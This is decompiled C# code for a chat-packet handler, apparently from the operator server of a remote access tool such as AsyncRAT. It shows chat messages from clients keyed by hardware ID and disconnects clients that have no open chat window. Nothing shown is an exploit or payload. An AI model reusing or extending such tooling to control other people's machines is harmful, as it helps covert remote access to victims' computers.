using System;
using System.Threading;
using System.Windows.Forms;
using Server.Connection;
using Server.Forms;
using Server.MessagePack;

namespace Server.Handle_Packet
{
	// Token: 0x0200005C RID: 92
	public class HandleChat
	{
		// Token: 0x060002D7 RID: 727 RVA: 0x0001E480 File Offset: 0x0001C680
		public void Read(MsgPack unpack_msgpack, Clients client)
		{
			try
			{
				FormChat formChat = (FormChat)Application.OpenForms["chat:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
				if (formChat != null)
				{
					Console.Beep();
					formChat.richTextBox1.AppendText(unpack_msgpack.ForcePathObject("WriteInput").AsString);
					formChat.richTextBox1.SelectionStart = formChat.richTextBox1.TextLength;
					formChat.richTextBox1.ScrollToCaret();
				}
				else
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "chatExit";
					ThreadPool.QueueUserWorkItem(new WaitCallback(client.Send), msgPack.Encode2Bytes());
					client.Disconnected();
				}
			}
			catch
			{
			}
		}

		// Token: 0x060002D8 RID: 728 RVA: 0x0001E54C File Offset: 0x0001C74C
		public void GetClient(MsgPack unpack_msgpack, Clients client)
		{
			FormChat formChat = (FormChat)Application.OpenForms["chat:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
			if (formChat != null && formChat.Client == null)
			{
				formChat.Client = client;
				formChat.textBox1.Enabled = true;
				formChat.timer1.Enabled = true;
			}
		}
	}
}
